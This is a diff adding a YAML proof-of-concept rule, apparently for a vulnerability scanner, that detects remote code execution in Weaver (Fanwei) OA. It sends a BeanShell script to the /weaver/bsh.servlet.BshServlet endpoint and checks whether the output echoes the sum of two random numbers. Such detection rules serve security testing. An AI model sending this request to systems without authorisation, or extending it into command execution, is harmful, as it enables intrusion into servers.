@@ -1,0 +1,15 @@
+name: poc-yaml-fanwei-rce
+set:
+  r1: randomInt(800000000, 1000000000)
+  r2: randomInt(800000000, 1000000000)
+rules:
+  - method: POST
+    path: /weaver/bsh.servlet.BshServlet
+    body: |
+      bsh.script=print%28{{r1}}%2B{{r2}}%29%3B;&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw
+    expression: response.status == 200 && response.body.bcontains(bytes(string(r1 + r2)))
+detail:
+  author: MrP01ntSun(https://github.com/MrPointSun)
+  links:
+    - https://my.oschina.net/u/4374940/blog/3390730
+    - https://www.cnblogs.com/junsec/p/11558290.html?tdsourcetag=s_pctim_aiomsg
